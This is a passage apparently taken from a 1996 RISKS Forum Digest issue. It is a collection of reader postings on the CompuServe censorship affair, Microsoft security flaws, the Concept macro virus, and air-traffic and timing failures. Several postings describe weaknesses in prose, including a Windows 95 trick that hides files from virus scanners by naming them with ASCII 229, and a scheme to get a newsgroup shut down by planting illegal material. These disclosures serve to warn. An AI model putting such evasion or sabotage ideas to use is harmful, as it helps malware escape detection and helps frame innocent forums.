cypherpunks list and refined for Community ConneXion's "Hack Microsoft"
promotion, <A HREF="http://www.c2.org/hackmsoft/">http://www.c2.org/hackmsoft/</A>.
<P>
We have since been given a sample trojan horse that will very efficiently
exploit this bug in Windows for Workgroups. Distributed as a Word Basic
virus, MIME attachment, or downloadable archive (note that Exchange and
Internet Explorer unwisely execute downloaded binaries without even a virus
check, a problem that Sun's Java has long acknowledged and addressed), this
trojan horse could collect passwords and other sensitive information from
.PWL files and other sources and send them out via e-mail, possibly through<BR>
an untraceable chain of remailers or to a throwaway trial account on, for
example, America "Online."
<P>
We believe that it would be highly irresponsible to release the full version
of this hack, but we will soon release a crippled demonstration-only version
if Microsoft does not at the very least admit that this problem has always
affected Windows for Workgroups, correct their online documentation, publish
the specifications of the Win95 security patch for review by outside
security experts, and issue a public retraction.

In other news, I assume everyone knows by now that NT's claimed C2 security
rating was granted *for use a standalone workstation only*. It has been
widely reported that its NetWare Services implementation does not ask for
passwords for nonexistent usernames, making a potential cracker's job that
much easier. The correct response, which is given by real NetWare servers
and other servers that are certified C2-secure on networks, is to silently
ask for a password in all cases.
<P>
I started getting copies of <A HREF="mailto:hackmsoft@c2.org">hackmsoft@c2.org</A> mail on December 20th. It's
really depressing.
<P>
We've also seen problems with Microsoft Access 95's security. Basically,
there is none. Anyone can access the network-enabled Access as any user
without knowing the password. We don't think it would be responsible to
publicly release this hack, either, until Microsoft has had another chance
to patch the hole (they've known about it for some time).
<P>
These are far, far worse than the widely publicized bugs in Netscape's SSL
implementation, which have been fixed. Yet the only place I've seen them
mentioned is the lapdog Seattle Times, which only reports bug *fixes* in
glowing terms.

I have not been a participant in this newsgroup, so I am trusting the advice
of someone who is that the following constitutes a risk of interest.
<P>
Concerned about the amount of disk space on my laptop, I opted to use the copy
of Netscape on my company's server.  I configured Netscape to my parameters
and used it this way until I realized that it was important enough to live on
my C: drive.
<P>
A few months after running Netscape from the server, I began to get an
occasional e-mail which seemed to be intended for someone else.  It took me a
while to realize that my netscape.ini file had been saved on the server, not
on my laptop.  Apparently, other employees were copying the INI file and, not
knowing how to properly set it up, were leaving my return address in place.
<P>
The primary risk here is clear:  saving various .cfg, .ini, etc. files in the
default location determined by the application may result in the information
in those files being made available to the public.  Since these files may
include logon names and passwords, care must be taken to ensure that they are
saved in appropriate locations.
<P>
There is also a secondary risk:  by intentionally supplying a .cfg or .ini
file of his/her own design to the common server, a hacker could configure the
apps of the unwary in ways which are not wanted.

Klaus Brunnstein's work is of great value for the computing community, but
he messed up some concepts of German criminal law.
<P>
KB:	CompuServe OVERREACTED in blocking access to ALL these
electronic fora WORLDWIDE.  As most national laws (with
exception of some laws requesting universal applicability :-),
German law deliberately applies to Germany :-)!
<P>
Wrong. In special cases, German criminal law claims international validity.
One of these cases (listed in Par.6 of the Criminal Code) is the
distribution of pornographic material containing "violent actions, sex of
human beings with animals or child abuse" ["Gewalttaetigkeiten, den
sexuellen Misbrauch von Kindern oder sexuelle Handlungen von Menschen mit
Tieren"].
<P>
KB:	Either was CompuServe TECHNICALLY UNABLE to react ONLY FOR
GERMAN users (and leave worldwide users unaffected).
<P>
This was the case, according to German media reports. TV newscast "Frontal"
reported Tuesday evening that CompuServe is rewriting its Software to allow
Internet access control according to the nationality of the user. But
regarding child pornography and the german law, this wouldn't help
CompuServe much. - see above -
<P>
KB:	The procedure of Bavarian State Attorney may have one week point
in whether the term "writing" (evidently meant by legislators as
applying to traditional paper-work) may apply to "electronic
documents" even in "virtual form".
<P>
Wrong again. Par. 11 Sentence 3 of the Criminal Code defines the word
"writing" ["Schriften"] as applying to audio and video storage systems,
pictures or any other form of representation ["Ton- und Bildtraeger,
Abbildungen und andere Darstellung"]. Technically, this is a so-called "open
catalog" definition, this means that any attorney or judge can add any form
of representation of a contents he or she chooses appropriate - even
non-physical representations on screens.
<P>
So, where's another RISK?

Any CompuServe Executive reading comp.risks? No?

In an excellent analysis of the stupidity of CompuServe staff in
overreacting to the Bavarian request for cooperation in stopping the
distribution of child pornography in their jurisdiction &lt;Metaphorplay on
Compuservile&gt;, Henry Baker wrote the following dismaying text:
<P>
&gt; Copyright (c) 1996 by Henry G. Baker.  All rights reserved.<BR>
&gt; ** Warning: Due to its censorship, CompuServe and its subscribers  **<BR>
&gt; ** are expressly prohibited from storing or copying this document  **<BR>
&gt; ** on CompuServe in any form.                                      **
<P>
I and many other CompuServe (CIS) users despise the decision to apply a
blanket prohibition against the news groups.  At the same time, I protest
the inclusion of this prohibition in the RISKS FORUM DIGEST.
<OL>
<LI>CompuServe is a private organization, not a government agency.  If
CompuServe management were to decide to prevent access to news groups with,
say, the letter "k" in the third place of the name, its customers could (a)
protest to CIS management; (2) obtain Internet access through another
supplier; and (3) cancel their subscriptions.  However, there would be no
violation whatever of free speech in such action, even though it would be
stupid, counter-productive and offensive.  A commercial service has no
requirement to provide all possible services--it merely supplies services
and takes the commercial consequences of its actions.
<P>
In the current case, if enough CIS users require access to the banned
groups, the economic consequences will be borne by CIS owners and
shareholders.  Treating us CIS subscribers as pariahs because we find the
balance of services at CIS acceptable even with the stupid ban is itself a
bizarre overreaction.
<P>
So Mr Baker wants to punish subscribers to CIS because it DOESN'T provide
access to all news groups.  What's next, punishment of subscribers to
services who provide access to new groups that he _dislikes_?  Is Mr Baker
aligning himself with the lunatics in the far-right religious fringe who
would jump on _him_ for subscribing to an Internet access provider which
_does_ allow access to news groups _they_ disapprove of?
<P>
How would Mr Baker respond to a suggestion that CompuServe ban all postings
from people with netcom.com addresses?  Would that seem fair?  Why not?
<P>
<LI>CIS is not simply an Internet access provider.  Many users depend on
the service for access to databases simply unavailable on the Internet.  Why
should Baker or anyone else single us out for punishment in this way?
<P>
<LI>The internal response from CIS subscribers on CIS management has
been enormous--and negative.  There have been thousands of messages all over
the service in which the ban is dissected; there have also been public
meetings in the CIS Conference Rooms where the issues are analyzed.
<P>
Baker's prohibition prevents me from supplying ammunition to the very forces
who are on Baker's own side of the argument.  His article would normally be
posted in the NCSA Forum where it could be read by 50,000 members who could
then build on his contribution.  Now it will be available only in the
archive copy of RISKS instead of in the public Forum.  Pity.
<P>
<LI>Because many of us receive the RISKS FORUM DIGEST via e-mail on
CompuServe, we simply cannot comply with Baker's prohibition even if we
wanted to.  The DIGEST did indeed reside on CIS computers until I downloaded
it from my e-mail in-basket.  Since I certainly will not unsubscribe to the
DIGEST simply because one correspondent wishes to punish all CIS users, I
will continue to receive his occasional contributions whether he wants me to
or not.  I suggest that Baker either stop publishing his messages in the
DIGEST or stop appending his offensive signature text.
<P>
<LI>The National Computer Security Association (NCSA) makes RISKS FORUM
DIGEST archives available in a Library in the NCSA FORUM.  Is Mr Baker
proposing that we _edit_ the RISKS FORUM DIGEST to remove his contributions?
Preposterous.  I refuse to tamper with the contents of the DIGEST simply
because one individual is in a snit about some jerk of a CIS manager's
decision to go into hysterics over a request from a Bavarian prosecutor.
<P>
If Mr Baker has a problem with that, I suggest he contact a lawyer.
<P>
<LI>The NCSA extracts certain individual articles from the RISKS FORUM
DIGEST and other Internet publications for inclusion in specific sections of
the Forum; for example, this message will appear in the PRIVACY/ETHICS
section of the NCSA Forum.  Contrariwise, several Sysops from the NCSA Forum
cross-post our summaries of news wire service articles to RISKS and other
new groups.  The arrangement makes the information and opinions available to
a wider audience than would otherwise see the contributions.
<P>
One contributor to RISKS has requested that we NOT post his contributions to
the Forum and we have complied with his request even though we think it is
ridiculous for him to stop the 50,000 people in the NCSA Forum from seeing
his public postings.  We will comply with Mr Baker's implicit request as
well even though it's a nuisance to have to remember that these two
individuals have such a prohibition in place.  I shudder to think what will
happen if lots of people append this kind of restriction on their postings.
</OL>
The more fundamental issue for RISKS FORUM DIGEST and news group moderators
and users in general is whether it is acceptable for a contributor to (1)
post a message for worldwide distribution and simultaneously to demand that
it not be received by or redistributed to users of specific services.
<P>
Mr Baker's prohibition is an example of the very problem he attacks in his
message.  Carried further, one might see demands that a message not be
available to subscribers of a service because specific users of that service
have spammed the Net; or because the managers wear ties; or because people
who eat meat subscribe to the service; or ....  the possible targets of
prejudice are infinite.
<P>
If Mr Baker doesn't want his message to be public then he shouldn't post it
in public.
<P>
I hope that Mr Baker will reconsider his offensive signature string and that
no one else will include such prohibitions in their contributions to RISKS.

I have nothing against Compuserve subscribers themselves.  I hope to
continue fruitful dialog with them through other ISP's.  There is currently
a wide choice of excellent, inexpensive, non-censoring ISP's, but how long
this choice will remain due to government interference is very much in
doubt.
<P>
Compuserve apparently lost their backbone and refused to fight for their
subscribers, so why should their subscribers fight for Compuserve?
Subscribers should all put their subscriptions 'in escrow' until full
Internet service is provided, the same way that tenants put their rent in
escrow until the landlord fixes their electricity, their water, or their
sewer(!)  ;-)

Paraphrasing Shakespeare, Compuserve should screw their courage to the

<P>
Your article "Re: X-31 crash follow up" in <A HREF="/Risks/17.60.html">RISKS-17.60</A> tends to trivialize
the importance of development methodology for reliable systems in favor of
more thoughtful programmers.  While this attitude may be appropriate to your
role in training programmers, I would hope that the majority of RISKS
readers would not give it too much weight.
<P>
Locating the source of a design fault is not a futile waste of time in many
cases.  You do, however, have a clue as indicated by your parenthetical
"except perhaps during an internal post-mortem to decide whose head is going
to roll!"  The identification of the source of the problem often determines
who pays for the change, and perhaps pays damages for the failure.  More
importantly it can identify flaws in the development methods used and
prevent future failures.
<P>
Your first point is very dependent on *who* thinks the flaw is obvious.  For
every user experience problem fixed, two problem reports get satisfied with
a change to the documentation to remove reference to a non-existent feature
deemed unimportant.
<P>
You may believe that "The omission of an obviously desirable feature IS A
DESIGN FAULT." but the user will probably pay for an upgrade to get that
feature.
<P>
What constitutes "required behaviour" *is* merely "what is in the
specification" when deciding whether you have to pay the invoice, and
usually in the test plan.  Whether you get "WHAT A REASONABLE USER WOULD
EXPECT" depends on the quality of both the vendor and the specification.  If
it is in the specification, it is likely to get tested and actually work
correctly when needed.
<P>
High reliability systems cost much more to develop than systems that only
need to work fairly well.  I would prefer to anticipate this, and invest in
attempting complete and accurate specifications, than to hope that every
programmer will understand the big picture well enough to make their own
design decisions.  I would like the programmer to be rewarded for
identifying a specification flaw to the designers, but proceed to build the
design until it changes.

PRELIMINARY CALL FOR PAPERS<BR>
NEW SECURITY PARADIGMS '96
<P>
A workshop sponsored by ACM SIGSAC, the Department of Defense, and the
Aerospace Institute:<BR>
UCLA Conference Center<BR>
Lake Arrowhead, CA<BR>
September 16-19, 1996
<P>
Paradigm shifts disrupt the status quo, destroy outdated ideas, and open the
way to new possibilities.  This workshop explores radical new models for
computer security, such as strategies for securing very large networks,
providing software safety in large systems, and developing ethics in
international cyberspace.  The goal is to develop transcendent solutions
that provide the flexibility and interoperability users require in trusted
systems.
<P>
We offer a creative and constructive workshop environment for about
25 participants at the beautiful UCLA Conference Center on lake Arrowhead<BR>
in the San Bernardino Mountains, California.  Dress is casual.  The tone is
exploratory rather than critical.  The refereed papers will be printed in a
workshop proceedings.  To participate, submit either a research paper or a
5-10 page position paper, preferably via e-mail, to Program Chairs Catherine<BR>
Meadows and David Bailey at the e-mail addresses listed below by April 1,
1996.  Alternately, submit five copies of a hard-copy paper to either<BR>
program chair by March 24, 1996.  The Program Committee will referee the
papers and notify authors of acceptance status by June 9, 1996.
<P>
Scholarships are available.
<P>
As it becomes available, more information will be provided on-line.<BR>

PRESS RELEASE, FOR IMMEDIATE RELEASE, January 11, 1995
<P>
Michael J. Yamaguchi, United States Attorney for the Northern
District of California, announced today that his office has declined
prosecution of any individuals in connection with the posting to USENET in
June 1991 of the encryption program known as "Pretty Good Privacy."  The
investigation has been closed.  No further comment will be made by the U.S.
Attorney's office on the reasons for declination.
<P>
Assistant U.S. Attorney William P. Keane of the U.S. Attorney's
Office in San Jose at (408) 535-5053 oversaw the government's investigation
of the case.

<P>
In this Sunday's paper, the AP reported on yet another failure of the ATC
system.  Apparently, this one was caused by a technician who (after an
overnight shift) thought he was working on the standby power conditioning
system.
<P>
Power was killed when he went to reinsert a "card" into the system at about
6:55am.  "We were completely in the dark for at least 5 and more like 6
minutes, "said a controller and union representative for the National Air
Traffic Controllers Association.
<P>
Limited radio contact was restored within minutes, but the main radio and
communications system was not fully operational until 8:38am, and all
systems were not back to normal until 9:32.
<P>
It was reported that no emergencies were reported during that time, possibly
due in part because it happened at a time when traffic normally was low.
<P>
My analysis: You often will see work being carried out by a group of 2 or 3
people in which only 1 of the people is really "working".  A classic example
was a local televised problem that had some utility company working on the
problem.  The news was interviewing a representative at the site who was
saying "we're working our butts off to get it fixed" while in the background
there were 3 or 4 guys standing around watching another guy dig.
<P>
It sounds like 2 possible actions can be taken in the future.  1 is making
it easier to distinguish the "live" and "standby" systems (some red spray
paint perhaps).  Another is to have someone there "helping" the technician.
"Whoa, Bob!  Don't'cha think you should be doing that on the STANDBY
machine?"  Overnight shifts can be a real killer (no pun intended) if you
aren't extra careful.
<P>
(On a side note, I watched Apollo 13 a couple of weeks ago and think techies
can get a lot out of this movie.  I loved watching the control systems.  In
particular I remember the silenceable alarms similar to the medical ones
we've been talking about lately).

The RISKS described below are that when faced with new technology, people
who don't know what they are talking about, yet are given credence, can do
more harm than good.   [This is in fact an old topic in RISKS, but it has
some new twists.  PGN]
<P>
I encountered a double-barreled example on the radio today. The Victorian
Government (Victoria is a state of Australia) plans to build a freeway
system called CitiLink. It will be built and run by private companies and a
French company will be collecting tolls for about 34 years. The road will
cover a distance of something like 40km (22 miles).
<P>
A questionaire sent out by the opposition to the government (who detest
anything the government does - moreso than normal these days) was being
discussed on the radio. The 2 points discussed were completely misunderstood
by both the interviewer and the opposition member of parliament who was
pushing the survey results.
<OL>
<LI>The system will use a transponder in the car to automatically collect
tolls. The questionaire posed a question describing how you would be able to
open an account with the toll collectors and pre-deposit money into it.  It
then stated that they therefore had access to your bank balances and that
was an invasion of privacy. Did people support such a scheme?
<P>
It had escaped the minds of these people that if you pay anybody in advance,
or open an account with anybody, that person will know your balance. They
have to. If they don't, who else will? These two had decided that this was
an EFTPOS style system and that they could query your balance unlike any
other EFTPOS system.
<P>
This is on the number 1 rating radio show in Melbourne.
<P>
<LI>They claimed that the transponders had 2 way communication with the toll
`booms' and that therefore, all sorts of information about you and your car
could be sent. For example: SPEED! The fact that the transponder is taped to
your windshield and has no other connection to the car escaped their
attention.
</OL>
Far more important, they missed the _real_ RISK. The tolls are to be taken
at over half a dozen regions along the route. The opposition is yet to bring
up the very real fact that any system that records when you go through each
toll (which most people would insist on seeing on their bills!) can
calculate your average speed between two such points and if you get from
point A to point B too quickly, know you've been speeding.
<P>
I am yet to hear any discussion of this point and the privacy problems
associated with it. Does the legislation prevent or allow the authorities to
obtain such information and/or use it in this way.
<P>
The only discussion of speed was whether the transponder could transmit the
speed of your car to the toll detectors. And the audience of these
politicians and media geniuses (genii?) will believe anything they hear!

Think about the impact of doing [the correction] at midnight.  1)The day
increments to January 1, 1996, 00:00:00. 2) you reset the clock to 23:59:59
- minus one second.  3) The clock starts running again.  4) the day flips
over, and it's suddenly, January 2, 1996, 00:00:00. No wonder they had
problems.  I know that's what my VCR would do if I tried that :-).
<P>
My understanding is that in order to minimize problems, this "duplicate"
second was supposed to occur at 7:00pm on December 31, 1995.  (Not sure
about 7:00pm, but) It was *not* supposed to happen at midnight.  But, based
on the observed effect it sounds like the adjustment did, in fact, happen at
midnight.
<P>
What I don't understand is: shouldn't NIST be the responsible body to set
the official time (moment) when the leap second occurred!!??  Did they
decide on 7:00pm 12/31, and then the implementors didn't follow the
specification?  :-)) Or were we at the mercy of a world organization
(something else for the militias to worry about :-), that specified the UT
(new/improved GMT :-) when it occurred, and it just happened to be midnight
in Washington?  (Although, I think the clock is actually in Colorado?)
<P>
I wonder if the government shutdown had any impact on this!!

understanding of the issues related to network security and do not know how
to protect their systems from the level of threat that exists on the
Internet today.
<P>
The seminar will cover fundamental security practices for UNIX system
administration.  Participants will learn about the latest information on
security problems, defensive strategies, offensive strategies, network
security, and establishing appropriate site security policy.
<P>

</ADDRESS>
<I>Thu, 11 Jan 1996 03:24:09 -0500</I>
<P>
I've recently had the unfortunate `pleasure' of dealing with the troubling
consequences of the `Concept Virus' that affects Microsoft Word for
Windows (WinWord) and Word for Macintosh.  (To refresh your memory, the
`Concept Virus' is a Trojan horse that rides on AutoExec macros that can
be hidden in documents)
<P>
Microsoft has distributed a set of macros that partially protects users -
the macros identify documents that have macros and warns users that these
macros MIGHT be hazardous...
<P>
Several risks here...
<OL>
<LI>The `fix' distributed by Microsoft isn't complete - there are ways to
open documents (like from the recently used files list) that don't trigger
the protection macros.
<P>
<LI>WordBasic is a very useful (albeit very quirky) language - enough so
that alot of people have taken the time to learn it and build useful things
with it - and enough so that just saying "don't run macros" is
unacceptable...  And automating tasks without use of AutoOpen macros gets
much more difficult... (a macro named `AutoOpen' is executed when you open
a WinWord document)
<P>
<LI>Without a clear distinction between CODE and DATA, we have the
beginnings of a new form of terrorism - is it safe to read this document?
<P>
<LI>The REAL risk seems to be ignored here.  WinWord DOCUMENTS cannot
contain macros - this is reserved to TEMPLATES - the problem here is that
you can give a TEMPLATE a ".DOC" extension and it will look to all in the
outside world that it is really a DOCUMENT.  The key flaw here (at many
levels - from the operating system on up to the individual user) is that
everything seems to be relying on the NAME of the file to indicate the TYPE
of the file - rather than looking at the contents of the file to determine
type.
</OL>
Microsoft has spent a lot of effort building on this fundamental flaw with
all versions of Windows - the application run to edit/view/print a file is
determined by the extension, not by the actual file format.  Give a file a
filename with an inappropriate extension and strange things can happen.
(many applications will do a little error checking of their own and die
gracefully - others will just crash - but... use your imagination!)  This is
really a thread all of its own...
<P>
What can we do to address this problem?
<OL>
<LI>ensure that `code' and `data' are clearly distinguishable - we should be
able to communicate data without fear - code, on the other hand, is a
different issue...
<P>
<LI>develop a standard code wrapper scheme to provide authentication and
certification - Authentication (ala PGP) to verify that the file wasn't

creator) and Certification to allow proxies to bestow `trusted' status (This
would allow trusted third parties to `screen' code for you - the `certifier'
would also append a PGP-style signature).  Users would have a repository of
public keys for `trusted' sources - the code is `trusted' if either the
`creator' or the `certifier' is in the repository (and, of course, the
signature and the key check out OK)
<P>
<LI>start working NOW to get rid of U.S. export restrictions on crypto
technology - good validation (and, for that matter, good anti-piracy)
depends on secure encryption methods - if we can't export it, we can't use
it in a world marketplace.  I'm sure I'm not the first person in the world
to think of encoding messages in pictures or sound files - not too
efficient, but what's a little bandwidth when you really have something to
hide?

<P>
I really do not understand Mr. Kabay's concern for C$. (Of course, the
repeated reference to the NCSA forum may indicate that there is some bias
there.)  Mr. Baker is free to write whatever he wants including a rather
restrictive copyright notice.  Peter is free to publish or not and C$ is
free (practically not legally speaking) to respect it or not.
<P>
As an expression of intent it is clear that once the electronic word reaches
the Internet, any hope for control is about the same as controlling cats.
Certainly, if notices were universally respected, I would have retired long
ago from shareware revenue. Fortunately, it was not my expectation to derive
an income from it, rather to have some measure of control hence "copyrighted
freeware".
<P>
I have an opinion on the subject (in fact is the same one I sent to Klaus
before the first RISKS posting appeared) but it is really not necessary to
discuss. The question Mr. Baker faces is the same as the German authorities
face concerning "International" regulations: enforceability.
<P>
Their power to enforce does not extend beyond the limits of their
sovereignty. C$ does business in Germany. If they wish to continue then a
corporate decision must be made (and there are a number of options). It is
probable that Mr. Baker has even less ability to enforce his copyright
statement.
<P>
However I suspect that "free speech" is often confused with "property
rights". Anyone may disagree with Mr. Baker's position but to say that he is
wrong to take that position or to declare an intent to limit dissemination
is something entirely different.
<P>
I have been flamed on numerous occasions for refusing to provide viral code
or software I have developed to people simply because they feel they have a
need (often just a desire or pure laziness) for it. That is my "right". As a
result it is bothersome to see a respected member of the community chiding
another for putting restrictions on dissemination of what they have created
particularly when the restriction was obviously intended to be a statement
itself.

CompuServe's recent action to shut down subscriber access to 200 newsgroups
carrying sexual content was motivated more by U.S. politics than German
objections, apparently.  Reports that the action was in response to Bavarian
government complaints are false -- the incident was sparked by an inquiry
from a district attorney in Munich regarding the alt.sex groups. Leaders of
all four parties in the Bundestag have spoken out against any legislation to
regulate the Internet and agree that existing criminal law in Germany is
sufficient to handle any potential legal misconduct.  It's rumored that,
rather than reacting to German authorities, CompuServe's restrictions were
enacted in response to legislation pending in Congress against "indecent"
digital content in an effort to bolster CompuServe's reputation as a morally
responsible online service provider.  (STERN Infomat, 3, 1996)

<P>
It puzzles me that so many people are up in arms over Compuserve's decision
to block newsgroups, no matter how many. Discussion over the (lack of) right
of individual countries to say what they think is reasonable is bizarre, to
say the least.
<P>
If Germany decides, in any way, that it does not want certain sorts of
material available via Compuserve (a company that provides what amounts to
the largest bulletin board in the world - the Internet is different in that
each computer is actually part of it), and that decision is in accordance
with German law, it has the right to enforce it. Compuserve might find it
technically simpler to treat the entire world as basically groups of people
speaking funny languages, but if it wants to trade in Germany, it must act
in accordance with its laws, however bewildering or unreasonable.
<P>
If Compuserve finds it easiest to solve this problem (almost certainly in
the short-term) by canning all access to some news groups, then so be it -
you don't have to use Compuserve if you don't want to. The risk of trying to
insist that US liberalism should apply across the globe seems dangerous to
me. Expecting another country to obey according to your rules has probably
been a significant factor in the starting of a number of wars over the
centuries!
<P>
Global war, or even a local one, is not a likely consequence of differing
restrictions on pornographic material on Compuserve or the Internet. But, a
growing feeling that anyone should be allowed to say anything may be the
outcome. As is evidenced by comments in many newsgroups, the US dominates
Compuserve and the Internet - but US ideals are definitely not appropriate
nor appreciated by every country.

<P>
I've thought of a RISK arising from the reaction of CompuServe to
pornography on its discussion groups.
<P>
If there were a discussion group that you wanted to attack, you could submit
some child pornography to it, and then wait for CompuServe to do your dirty
work for you, and close it down. And if you wanted to be thoroughly
despicable, you could submit the pornography via an anonymous remailer.
Every news group in the world is wide open to that kind of risk.
<P>
My opinion on the subject is this: if someone uses a telephone to commit a
crime, do you prosecute the telephone company? Obviously not - you prosecute
the person who committed the crime. I think that the case with Internet
service providers is similar.
<P>
Just because there are difficulties in the Internet, finding the person who
has committed the crime, doesn't make it reasonable to prosecute someone who
is innocent.

I feel compelled to point out that Robert Anton Wilson found an even more
elegant solution in one of his fictional works.  He believed it unlikely
that the Supreme Court justices would find their own names obscene, so
(using contemporary Justices) he would have a couple wildly thomasing in the
back of their car, a drunk man renquisting against a tree, a ditzy blonde
model with huge scalias, etc.

From: <A HREF="mailto:michael_kunze@spiegel.de">michael_kunze@spiegel.de</A> (Michael Kunze)
Newsgroups: alt.censorship
Subject: CIS censorship--The whole story
<P>
Dear Nettizens,
<P>
Some few five-hundred postings ago, I promised you let you have more details
about the CompuServe censorship case investigated by the editorial staff of
SPIEGEL online. It is not a story of evil but of people acting overambitious
and ignorant. And it is not quite as simple as DrG might be wishing!
<P>
To keep it short, here are the facts:
<P>
In 1994, a Task Force called "AG EDV" was set up by the Bavarian Minister of
Interior at the Police Headquarters in Munich. Initially, the Task Force was
formed to search persons dealing with pornographic material via BTX the
former online service of German Telekom and its work was limited to one
year.
<P>
For the moment, investigations of this Task Force ran successfully due to
the assistance of Telekom. But simultaneously, people being suspected
changed their ways of distributing either to closed BBS systems or chose
more secret methods. So the Task Force was compelled to enhance their
efforts and they raided Munich BBS systems.  Furthermore, they studied
computer magazines to find ads for pornographic CD-ROMs. During this
operation they found what they were looking for, and "PC Direkt", a Ziff
Davis publication, and some other magazine were forced to pulp some issues.
<P>
All activities of the Task Force could not have happened, if they were not
supported by a whole bunch of local prosecutors and judges.  Sticking
together, chatting, doing favours forms a part of the social life in Munich
- in malicious words - the `Munich swamp'.
<P>
The prevailing opinion of the Task Force and of some prosecutors is that
carriers of digital information could held responsible for the content of
what they are spreading. This meaning matches exactly the content of the
CDA. But this is only one point of view. Up to now, there doesn't exist any
law or direction in Germany concerning responsibilities of ISPs or online
services regarding contents they only do deliver. And so, judges decide from
case to case. The German department of justice thinks that carriers could be
held responsible if they deliver illegal content "deliberately". But then,
could one call them "carriers"?  [I suppose, if they are carrying "common"
materials, then they must be "common" carriers!  PGN]
<P>
Last summer, a kind of hysteria about Internet pornography broke out in
German media. A few journalist had made their first steps in the Internet
and discovered nasty postings in the alt.binaries.pictures.erotica Usenet
hierarchy. A student of Erlangen University was seized because of spreading
child porn via Usenet.  Then, the "Time" article about Internet porn was
published and quoted by nearly every German newspaper.
<P>
I think at that time the Task Force planned to investigate the Usenet.  Due
to the facts that CIS had become a big ISP and their German office is
located in Munich, CIS seemed to be a worthwhile target. Somehow the Task
Force managed to get a search warrant to investigate the Munich CIS office
on November, 22nd.  However, the search was more or less like a visit. Let
me quote the public prosecutor: CompuServe "was quite cooperative". "We sat
together talking about chances to kick pornographic contents out of
CompuServe's information system." The police officers just collected a copy
of the CompuServe association contract and the address of the CEO.
<P>
Two days later, CompuServe's German managers published that they "will do
anything to support the work of German authorities fighting against
pornography in Cyberspace". On December, 8th, CIS was handed a list of more
than 200 newsgroups by the Task Force. In my opinion, interpreting the
prosecutor and the CIS spokeswoman, this list was presented to CIS as
containing "suspicious newsgroups". In the attached letter from the
prosecutor it is said: "... it is left to CompuServe to take the necessary
steps to avoid possible liabilities to punishment."
<P>
So, if CompuServe should have ever had threats, it could have been only very
small ones. But there is no reason to their German management to risk
anything. CompuServe's approach is not to guarantee for "freedom of speech
and information" but to make "money".
<P>
When I interviewed the prosecutor, it soon became quite clear that his
department had tried to bring CIS to court to get its legal position checked
by some judges. Because of CIS servile tactics they had to give up their
goal.
<P>
The ominous list itself shows how ignorant the members of the Task Force are
about the Usenet. In my opinion, they just sampled all newsgroups containing
words like "sex", "erotic", "gay" and so on and put the result onto the
list.
<P>
We have two in-depth articles on the whole affair on our web server.  One is
an extended version of what I've posted here, the other deals with the CDA
and the actual political and legal situation concerning the Internet.
Unfortunately for US readers, these articles are in German, because we
didn't find the time to translate them. But I hope will can manage this
until Monday 8th, 8:00 AM, EST. Then, you should point your browser to

The *San Francisco Chronicle* reported on 13 January 1996 that the San
Francisco Association of Realtors had switched computer systems, resulting
in serious problems for many of their users (some of whom were reduced to
using the printed listings book, which comes out only once a week).
<P>
According to the Chron,
The members were promised faster computer response time, hourly
listing updates and high-resolution color photos of listed homes,
rather than the low-resolution black-and-white photos provided by
the old system.
<P>
Even before I had read much of the story, I wondered if they had
tried running both systems at once for a transition period.  The
article is ambiguous on that point; it reported that Georgeanne Bezille,
the association's systems manager, had said:
the new system had been running on a test basis for three months,
and that members were encouraged to try it. ``We had been warning
them that if they had a certain version of software they should
come in and upgrade,'' she remarked, but she said many didn't
bother.
but:
that running the old and new systems simultaneously would have been
impractical, because it would have required too many extra lines
and modems.
<P>
My guess is that most of the users didn't bother to try the test system
because there was no clear incentive for them to do so.
<P>
Also, it may have been that the very people who were technology-freaks
enough to try the test system were the ones who least needed to try
it.  While Bezille "blamed part of the problem on Pacific Bell which,
she said, incorrectly wired some lines at the association's end of the
computer system" (Pacific Bell's testing found no faults with the lines),
Some members also must share the blame, Bezille said, because they
didn't follow the procedures outlined in the user's manual, which
differ significantly from procedures under the old system.
Is this "blaming the victim" for a system design that did not include
an interactive transition mechanism?
<P>
It may also be that the new system is simply hard to use.  The
association "has hired 20 technicians to visit real estate offices
that are having trouble."
However, one agent complained that the two technicians sent to his
office ``didn't know what they were doing -- they had a book they
were looking at, trying to figure it out.''
If the "technicians" cannot figure it out, why should one expect a
non-technical user to be successful?

I've been noticing the increasing popularity of systems that claim to
generate real-time programs from simulations or very high level
environments. For example, it is possible to generate programs for some DSPs
from MatLab simulations and I've seen several examples of engineers using
LabView for real-time control of things that might explode.  Anyone out
there know of any studies on the reliability of such systems?  My initial
reaction is that I don't want to be anywhere near anything more dangerous
than a logic analyzer if it is controlled by, say Labview under Windows.

The Washington Post reported a close call at JFK airport in New York City on
5 Jan 96.  American flight 153 and Delta flight 153 were poised for takeoff<BR>
on different runways.  American flight 1190 was landing.  The departure
controller gave American 153 clearance to takeoff, but Delta 153 thought the
clearance was meant for them and started down the runway, narrowly missing
the landing American jet.  "We were about 10 seconds away from a major
airline collision on the runway," said the president of the air traffic
controllers' local at JFK.  "It was absolutely hair-raising.'  I see two
RISKS in this incident: 1) not designing systems to recognize these
potentially confusing situations, and 2) a risk similar to that encountered
with area codes and IP addresses: a growing number of customers in a limited
address space.  As airports get busier, mistaken identity incidents like
this could happen more often.

<P>
I've just discovered a huge security hole in Windows 95 that affects ALL
32-bit virus scanning programs.
<P>
The hole prevents A/V programs from accessing specially named files.
<P>
To understand how it works, you have to know a little bit about
how DOS works:
<P>
In DOS, when a file is deleted, the first character in the file name is
overwritten with ASCII character 229, and it is removed from the File
Allocation Table (FAT). DOS does lets you use ASCII 229 as the first
character of filenames and directories without any problems, though.
<P>
With windows 95, however, if it detects that the first character of
any file or directory is ASCII 229, it will tell you that the file
does not exist, even though this is not true.
<P>
I tested out McAfee's latest ViruScan 95, and it could not access
infected files in directories starting with ASCII 229. Additionally,
files starting with ASCII 229 that were infected came up as
uninfected.
<P>
It is interesting to note that old DOS-based scanners still work.
<P>
Potential RISKS include:
<UL>
<LI>Viruses that have specially named data files to prevent detection
<LI>Viruses that store a copy of themselves in a protected directory
and infect from there.
</UL>
NOTE that this appears to be a problem with Windows 95, not the virus
scanners.  Specifically, the built-in file querying routines. I can't think
of any workable solutions to the problem offhand.

"...  While the spacecraft was preparing for a
change in orientation to keep its low-gain antenna pointed toward
Earth, its onboard computer encountered a conflict with a relic
of special fault-protection software sent to the spacecraft
before its Jupiter arrival in December.  That conflict prompted
it to enter the safe mode."
<P>
This was described as a minor incident, and the engineers
restarted scheduled transmission.
<P>
It's not really worth a "Risks" mention, except to note (a) that
fault-protection software can cause crashes by itself and (b)
that NASA/JPL is able to design for fault-tolerance, remote
diagnostic, and repair.

I had occasion to search the web for a company name today on one of the

mention of the company's internet address in a xferlog-type file listing
the downloads of calendar-type pictures of (ahem) actresses.

